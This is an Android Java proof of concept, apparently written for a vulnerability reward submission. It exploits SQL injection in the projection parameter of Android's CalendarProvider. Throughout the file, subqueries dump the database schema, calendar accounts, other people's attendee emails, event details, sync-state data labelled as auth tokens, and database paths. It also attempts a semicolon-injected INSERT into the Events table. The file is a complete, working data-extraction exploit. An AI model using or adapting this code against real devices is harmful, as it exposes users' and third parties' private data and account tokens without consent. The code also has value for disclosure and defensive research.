package com.vrp.poc;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class CalendarDirectExtractActivity extends Activity {
    private static final String TAG = "CalDirectExtract";
    private TextView logView;
    private static final String CAL_URI = "content://com.android.calendar/events";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(6);
        logView.setText("CalendarProvider PROJECTION SQL Injection\n");
        logView.append("Direct data extraction — no blind technique needed\n");
        logView.append("UID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void runTests() {
        extractSchema();
        extractCalendarAccounts();
        extractAttendeeEmails();
        extractEventDetails();
        extractSyncState();
        extractExtendedProperties();
        extractDatabasePaths();
        extractSqliteInfo();
        testWriteViaProjection();
        log("\n=== ALL DIRECT EXTRACTION COMPLETE ===");
    }

    private String projQuery(String subquery) {
        try {
            Cursor c = getContentResolver().query(
                Uri.parse(CAL_URI),
                new String[]{"(" + subquery + ") AS x"},
                null, null, null);
            if (c != null && c.moveToFirst()) {
                String val = c.getString(0);
                c.close();
                return val;
            }
        } catch (Exception e) {
            return "[ERROR: " + shorten(e.getMessage(), 60) + "]";
        }
        return "(null)";
    }

    private void extractSchema() {
        log("=== PHASE 1: Full Database Schema Extraction ===\n");

        // Get all table names
        String countStr = projQuery("SELECT count(*) FROM sqlite_master WHERE type='table'");
        log("Total tables: " + countStr);

        int count = 0;
        try { count = Integer.parseInt(countStr); } catch (Exception e) {}

        for (int i = 0; i < count; i++) {
            String name = projQuery("SELECT name FROM sqlite_master WHERE type='table' ORDER BY name LIMIT 1 OFFSET " + i);
            log("[TABLE] " + name);

            // Get column info for interesting tables
            if (name != null && (name.equals("Attendees") || name.equals("Events") ||
                name.equals("_sync_state") || name.equals("Calendars") ||
                name.equals("ExtendedProperties") || name.equals("CalendarAlerts"))) {
                String colList = projQuery("SELECT group_concat(name,', ') FROM pragma_table_info('" + name + "')");
                log("  columns: " + colList);
            }
        }

        // Views
        String viewCount = projQuery("SELECT count(*) FROM sqlite_master WHERE type='view'");
        log("\nViews: " + viewCount);

        // Triggers
        String trigCount = projQuery("SELECT count(*) FROM sqlite_master WHERE type='trigger'");
        log("Triggers: " + trigCount);
        int tc = 0;
        try { tc = Integer.parseInt(trigCount); } catch (Exception e) {}
        for (int i = 0; i < Math.min(tc, 10); i++) {
            String tname = projQuery("SELECT name FROM sqlite_master WHERE type='trigger' ORDER BY name LIMIT 1 OFFSET " + i);
            log("[TRIGGER] " + tname);
        }
    }

    private void extractCalendarAccounts() {
        log("\n=== PHASE 2: Calendar Account Extraction ===\n");

        String calCount = projQuery("SELECT count(*) FROM Calendars");
        log("Calendars: " + calCount);

        int count = 0;
        try { count = Integer.parseInt(calCount); } catch (Exception e) {}

        for (int i = 0; i < count; i++) {
            String name = projQuery("SELECT calendar_displayName FROM Calendars LIMIT 1 OFFSET " + i);
            String acctName = projQuery("SELECT account_name FROM Calendars LIMIT 1 OFFSET " + i);
            String acctType = projQuery("SELECT account_type FROM Calendars LIMIT 1 OFFSET " + i);
            String owner = projQuery("SELECT ownerAccount FROM Calendars LIMIT 1 OFFSET " + i);
            String syncId = projQuery("SELECT _sync_id FROM Calendars LIMIT 1 OFFSET " + i);
            log("[CALENDAR] " + name);
            log("  account: " + acctName + " (" + acctType + ")");
            log("  owner: " + owner);
            log("  sync_id: " + syncId);
        }
    }

    private void extractAttendeeEmails() {
        log("\n=== PHASE 3: Attendee Email Extraction ===\n");
        log("(Other people's email addresses from calendar events)\n");

        String attCount = projQuery("SELECT count(*) FROM Attendees");
        log("Total attendees: " + attCount);

        int count = 0;
        try { count = Integer.parseInt(attCount); } catch (Exception e) {}

        for (int i = 0; i < Math.min(count, 20); i++) {
            String email = projQuery("SELECT attendeeEmail FROM Attendees LIMIT 1 OFFSET " + i);
            String name = projQuery("SELECT attendeeName FROM Attendees LIMIT 1 OFFSET " + i);
            String status = projQuery("SELECT attendeeStatus FROM Attendees LIMIT 1 OFFSET " + i);
            String rel = projQuery("SELECT attendeeRelationship FROM Attendees LIMIT 1 OFFSET " + i);
            String eventId = projQuery("SELECT event_id FROM Attendees LIMIT 1 OFFSET " + i);
            log("[ATTENDEE] email=" + email + " name=" + name +
                " status=" + status + " rel=" + rel + " event_id=" + eventId);
        }

        // Get unique attendee emails
        String uniqueEmails = projQuery("SELECT count(DISTINCT attendeeEmail) FROM Attendees");
        log("\nUnique attendee emails: " + uniqueEmails);

        // Extract unique emails
        int ue = 0;
        try { ue = Integer.parseInt(uniqueEmails); } catch (Exception e) {}
        for (int i = 0; i < Math.min(ue, 10); i++) {
            String email = projQuery("SELECT DISTINCT attendeeEmail FROM Attendees ORDER BY attendeeEmail LIMIT 1 OFFSET " + i);
            log("[UNIQUE-EMAIL] " + email);
        }
    }

    private void extractEventDetails() {
        log("\n=== PHASE 4: Event Detail Extraction ===\n");

        String evCount = projQuery("SELECT count(*) FROM Events");
        log("Total events: " + evCount);

        int count = 0;
        try { count = Integer.parseInt(evCount); } catch (Exception e) {}

        for (int i = 0; i < Math.min(count, 10); i++) {
            String title = projQuery("SELECT title FROM Events ORDER BY dtstart DESC LIMIT 1 OFFSET " + i);
            String desc = projQuery("SELECT description FROM Events ORDER BY dtstart DESC LIMIT 1 OFFSET " + i);
            String loc = projQuery("SELECT eventLocation FROM Events ORDER BY dtstart DESC LIMIT 1 OFFSET " + i);
            String organizer = projQuery("SELECT organizer FROM Events ORDER BY dtstart DESC LIMIT 1 OFFSET " + i);
            String dtstart = projQuery("SELECT datetime(dtstart/1000,'unixepoch') FROM Events ORDER BY dtstart DESC LIMIT 1 OFFSET " + i);
            String calId = projQuery("SELECT calendar_id FROM Events ORDER BY dtstart DESC LIMIT 1 OFFSET " + i);
            log("[EVENT] '" + title + "'");
            log("  desc: " + shorten(desc, 60));
            log("  location: " + loc);
            log("  organizer: " + organizer);
            log("  date: " + dtstart);
            log("  calendar_id: " + calId);
        }
    }

    private void extractSyncState() {
        log("\n=== PHASE 5: Sync State (Auth Tokens) ===\n");

        String syncCount = projQuery("SELECT count(*) FROM _sync_state");
        log("Sync state entries: " + syncCount);

        int count = 0;
        try { count = Integer.parseInt(syncCount); } catch (Exception e) {}

        for (int i = 0; i < count; i++) {
            String acct = projQuery("SELECT account_name FROM _sync_state LIMIT 1 OFFSET " + i);
            String acctType = projQuery("SELECT account_type FROM _sync_state LIMIT 1 OFFSET " + i);
            String dataHex = projQuery("SELECT hex(data) FROM _sync_state LIMIT 1 OFFSET " + i);
            String dataLen = projQuery("SELECT length(data) FROM _sync_state LIMIT 1 OFFSET " + i);
            log("[SYNC] account=" + acct + " type=" + acctType);
            log("  data_length=" + dataLen);
            if (dataHex != null && dataHex.length() <= 200) {
                log("  data_hex=" + dataHex);
            } else if (dataHex != null) {
                log("  data_hex=" + shorten(dataHex, 100) + " (truncated)");
            }
            // Try to decode as UTF-8
            String dataText = projQuery("SELECT data FROM _sync_state LIMIT 1 OFFSET " + i);
            if (dataText != null) {
                log("  data_text=" + shorten(dataText, 100));
            }
        }
    }

    private void extractExtendedProperties() {
        log("\n=== PHASE 6: Extended Properties ===\n");

        String propCount = projQuery("SELECT count(*) FROM ExtendedProperties");
        log("Extended properties: " + propCount);

        int count = 0;
        try { count = Integer.parseInt(propCount); } catch (Exception e) {}

        for (int i = 0; i < Math.min(count, 15); i++) {
            String name = projQuery("SELECT name FROM ExtendedProperties LIMIT 1 OFFSET " + i);
            String value = projQuery("SELECT value FROM ExtendedProperties LIMIT 1 OFFSET " + i);
            String eventId = projQuery("SELECT event_id FROM ExtendedProperties LIMIT 1 OFFSET " + i);
            log("[PROP] event=" + eventId + " " + name + "=" + shorten(value, 80));
        }
    }

    private void extractDatabasePaths() {
        log("\n=== PHASE 7: Database Metadata ===\n");

        // Database file paths
        String dbCount = projQuery("SELECT count(*) FROM pragma_database_list");
        log("Attached databases: " + dbCount);

        int count = 0;
        try { count = Integer.parseInt(dbCount); } catch (Exception e) {}

        for (int i = 0; i < count; i++) {
            String name = projQuery("SELECT name FROM pragma_database_list LIMIT 1 OFFSET " + i);
            String file = projQuery("SELECT file FROM pragma_database_list LIMIT 1 OFFSET " + i);
            log("[DB] name=" + name + " file=" + file);
        }

        // Database size
        String pages = projQuery("SELECT page_count FROM pragma_page_count");
        String pageSize = projQuery("SELECT page_size FROM pragma_page_size");
        log("DB size: " + pages + " pages x " + pageSize + " bytes");
    }

    private void extractSqliteInfo() {
        log("\n=== PHASE 8: SQLite Configuration ===\n");

        String ver = projQuery("SELECT sqlite_version()");
        log("SQLite version: " + ver);

        String srcId = projQuery("SELECT sqlite_source_id()");
        log("Source ID: " + srcId);

        // Compile options
        String[] options = {"ENABLE_LOAD_EXTENSION", "ENABLE_FTS5", "ENABLE_JSON1",
            "ENABLE_RTREE", "THREADSAFE", "ENABLE_DBSTAT_VTAB", "SECURE_DELETE",
            "ENABLE_FTS3", "ENABLE_FTS4"};
        for (String opt : options) {
            String result = projQuery("SELECT sqlite_compileoption_used('" + opt + "')");
            log("  " + opt + ": " + ("1".equals(result) ? "ENABLED" : "disabled"));
        }
    }

    private void testWriteViaProjection() {
        log("\n=== PHASE 9: Write Attempt via Projection ===\n");

        // Test if INSERT/UPDATE works in projection subquery
        String[] writePayloads = {
            "SELECT changes()",
            "SELECT total_changes()",
            "SELECT last_insert_rowid()",
        };

        for (String p : writePayloads) {
            String result = projQuery(p);
            log("[WRITE-INFO] " + p + " = " + result);
        }

        // Try semicolon injection in projection
        try {
            Cursor c = getContentResolver().query(
                Uri.parse(CAL_URI),
                new String[]{"_id; INSERT INTO Events(calendar_id,title,dtstart,dtend) VALUES(1,'INJECTED',0,0)--"},
                null, null, null);
            if (c != null) {
                log("[WRITE-SEMI] Semicolon in projection: rows=" + c.getCount());
                c.close();
            }
        } catch (Exception e) {
            log("[WRITE-SEMI] " + shorten(e.getMessage(), 80));
        }

        // Try REPLACE via subquery
        try {
            String result = projQuery("SELECT replace((SELECT title FROM Events LIMIT 1), 'a', 'X')");
            log("[REPLACE] String replace: " + result);
        } catch (Exception e) {
            log("[REPLACE] " + shorten(e.getMessage(), 80));
        }
    }

    private String shorten(String s, int max) {
        if (s == null) return "null";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }
}
